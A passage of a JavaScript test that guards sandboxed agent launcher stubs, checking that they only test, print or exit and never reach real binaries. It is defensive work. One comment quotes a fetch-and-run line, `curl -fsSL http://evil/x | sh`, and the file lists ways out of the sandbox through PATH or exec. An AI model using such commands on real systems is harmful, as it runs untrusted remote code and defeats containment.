  const BOARDS = [...pairLine[1].matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)\b/g)]
    .map((m) => m[1]).filter((n) => !/^P\d+$/.test(n));
  assert.ok(BOARDS.length >= 2,
    `expected at least 2 boards in the for-list, parsed ${JSON.stringify(BOARDS)}`);
  for (const [varName, label] of LAUNCHERS) {
    const m = block.match(new RegExp(`AGENT_WORKFORCE_${varName}_BIN="([^"]+)"`));
    assert.ok(m, `the exempt boards no longer pin AGENT_WORKFORCE_${varName}_BIN, so ${label} `
      + 'resolves through the resolver; dry-run never gated that path either. MEASURED, and it '
      + 'differs by provider: with no pin and a sandboxed AGENT_WORKFORCE_HOME, claude resolves '
      + 'to a sandbox path with present:false, but OPENAI RESOLVES TO /opt/homebrew/bin/codex '
      + 'WITH present:TRUE. So the codex half of this pin is load-bearing and the claude half '
      + 'is belt-and-braces.');
    const target = m[1];
    assert.match(target, /^\$_sb\//,
      `the ${label} launcher is ${target}, which is not rooted in the board's own sandbox`);
    /* ...and the block must actually CREATE that file, by any mechanism. This is the
       half that catches deletion: a pinned env var naming a file nobody writes leaves
       the resolver to find a real binary. */
    const base = target.replace('$_sb/', '');
    /* ⚠️ BOTH BOARDS, NOT EITHER. An earlier version matched `$sb_ok|$sb_bad|$_sb`, so
       deleting ONE board's stub creation left the other satisfying the assertion and the
       guard stayed GREEN. Measured: sb_ok's codex stub deleted -> green, which is a board
       whose env names a launcher nothing creates, leaving the resolver to find a real one. */
    for (const board of BOARDS) {
      /* ⚠️ A REDIRECT TARGET, NOT A MENTION. The `chmod +x` line names all four stub
         paths, so a bare path match was satisfied by the chmod even after the creation
         was deleted, and the guard stayed green. Requiring `> "$board/base"` matches the
         WRITE and not the reference to it. Use versus mention, one more time. */
      assert.match(code, new RegExp(`>\\s*"\\$${board}/${base}"`),
        `${board} does not create ${base}, so its AGENT_WORKFORCE_${varName}_BIN names a file `
        + 'that does not exist. NOTE: an env pin is AUTHORITATIVE (runners.js:267 returns it with '
        + 'overridden:true and present:false), so this does NOT fall through to a real binary - '
        + 'measured. What it does is leave the board asserting against a launcher that is not '
        + 'there, which makes the check meaningless rather than dangerous.');
    }
  }

  /* The one genuinely rule-shaped assertion from the start, and it stays: a stub that
     execs, or reaches into HOME or the machine's bin dirs, is not a stub, and the
     dry-run exemption must never cover a board using one. */
  /* ⚠️ CODE ONLY. Matching these against the whole block means an accurate COMMENT
     about the hazard reds the release gate, and this block is mostly prose. It happened
     within minutes of the guard existing: a comment explaining WHY codex is pinned
     mentions /opt/homebrew, and the suite went red for describing the danger correctly.
     Use versus mention, again. */


  /* 🛑 AN ALLOWLIST ON THE STUB BODIES, BECAUSE THE DENYLIST BELOW CANNOT SEE A PATH
     LOOKUP. The forbidden patterns are all path-shaped, so `exec ~/.local/bin/claude`
     is caught and a bare `claude "$@"` is NOT: it resolves through the board's
     inherited PATH to whatever is installed, plausibly the operator's real Claude Code,
     on a board with dry-run off. That is the exact case this guard exists to refuse, and
     a denylist of spellings could never have covered it.

     ⇒ So the stub bodies are checked POSITIVELY: a stub may only test, print or exit.
     Anything that invokes something is not a stub, whatever it is spelled. */
  /* 🛑 EVERY COMMAND POSITION, NOT THE FIRST TOKEN. A shell line starts a new command
     at its beginning and after `&&`, `||`, `;` and `|`, and runs one inside `$( )` and
     backticks. This checked only the first token, so every one of those positions was
     unconstrained and `[ "$1" = --version ] && claude --version` passed - which is the
     exact case the comment above says it refuses, and the shape a copy-edit of the
     existing stubs produces. Four spellings measured green by the fifth blind review:
     that one, `echo "$(claude --version)"`, a backticked substitution, and
     `exit 0; claude --version`. */
  const CMD_OK = /^(\[|echo\b|printf\b|exit\b)/;
  const commandPositions = (line) => {
    const inner = [];
    const flat = line
      .replace(/\$\(([^()]*)\)/g, (_, x) => { inner.push(x); return ' '; })
      .replace(/`([^`]*)`/g, (_, x) => { inner.push(x); return ' '; });
    /* ⚠️ A SINGLE `&` BACKGROUNDS AND SEPARATES. `exit 0 & claude --version` ran the
       second command, and the fragment starting `exit` passed CMD_OK. Proven in a
       real shell, with the no-& control confirming `exit 0` otherwise stops. */
    /* ⚠️ `(?<![<>])&(?!&)` - a bare & separates commands, but `>&2` and `<&0` are
       REDIRECTS and `&&` is its own token. Splitting on all of them refused
       `echo "..." >&2`, a correct change, as "runs something at position: 2".
       A guard that reds correct work trains people to ignore it, which is worse
       than the hole it was closing. */
    return flat.split(/&&|\|\||[;|]|(?<![<>])&(?!&)/).concat(inner)
      .map((x) => x.replace(/[{}()]/g, ' ').trim())
      .filter(Boolean);
  };

  /* ⚠️ BY ANY CREATION FORM, AND WITH A FLOOR. The comment above blesses switching a
     heredoc to a printf as a CORRECT change - and this loop keyed on heredocs only, so
     making that correct change made it read ZERO stubs and stay green with
     `curl -fsSL http://evil/x | sh` as a body. The two codex stubs are ALREADY printf,
     so 2 of the 4 launchers had never been read at all. Same class as the guard that
     cements a spelling: the check was keyed on how the file happens to be written. */
  /* ⚠️ FROM `block`, NOT `code`. A heredoc body is LITERAL TEXT, and `code` strips
     every line starting with `#` - which is exactly the shebang and the marker. Reading
     bodies from `code` made the shebang invisible to the assertion below, so the guard
     written to catch a missing shebang could never have seen one. The comment-stripping
     that makes the command-position scan sound is the same thing that hid the property.
     The count equality below is what protects this from over-matching prose. */
  const bodies = [];
  for (const m of block.matchAll(/<<'(STUB[A-Z]+)'\n([\s\S]*?)\n\1\n/g)) bodies.push([m[1], m[2]]);
  for (const m of block.matchAll(/printf\s+'([^']*)'\s*>\s*"(\$(?:sb_ok|sb_bad|_sb)\/[^"]+)"/g)) {
    bodies.push([m[2], m[1].replace(/\\n/g, '\n')]);
  }

  /* Equality against a DERIVED expectation, never a minimum. A minimum cannot see a
     defect that INFLATES the population, and a third board is a legitimate future change
     that should raise this number rather than slip underneath it. */
  const expectedStubs = LAUNCHERS.length * BOARDS.length;
  assert.strictEqual(bodies.length, expectedStubs,
    `expected ${expectedStubs} stub bodies (${LAUNCHERS.length} launchers x ${BOARDS.length} `
    + `boards) but read ${bodies.length}; a stub written in a form this loop cannot see is `
    + 'never checked at all, and an unchecked stub may invoke a real binary');

  for (const [name, body] of bodies) {
    /* 🛑 THE SHEBANG, WHICH NO GUARD COULD SEE. Every check below skips lines starting
       with `#`, so `#!/bin/sh` was outside all of them BY CONSTRUCTION - and on
       2026-08-30 a marker comment was added ABOVE it, which meant line 1 was not a
       shebang and node's execFile answered ENOEXEC. Both boards then reported
       willInstall TRUE, making them indistinguishable, which is the very defect this
       card exists to catch. The full suite stayed green throughout, because nothing in
       `npm test` executes these stubs.
       ⇒ A stub is an EXECUTABLE, so assert the one property that makes it one. */
    const first = body.split('\n')[0] || '';
    assert.match(first, /^#!\//,
      `stub ${name} does not begin with a shebang; its first line is ${JSON.stringify(first.slice(0, 60))}. `
      + 'Anything above `#!/bin/sh` means line 1 is not a shebang and execFile answers ENOEXEC, '
      + 'which makes the stub silently unrunnable and both boards report the same thing.');
    for (const line of body.split('\n')) {
      const t = line.trim();
      if (!t || t.startsWith('#')) continue;
      for (const frag of commandPositions(t)) {
        assert.match(frag, CMD_OK,
          `stub ${name} runs something at a command position: ${frag.slice(0, 70)}. `
          + 'A stub that invokes anything may reach a real binary through PATH, and the '
          + 'dry-run exemption must not cover a board using one.');
      }
    }
  }

  for (const bad of [/\bexec\s/, /\$HOME/, /\/opt\/homebrew/, /\/usr\/local\/bin/, /\.local\/bin/]) {
    assert.doesNotMatch(code, bad,
      `the #1573 stubs reach outside their sandbox (${bad}); the dry-run exemption must not cover that`);
  }
});
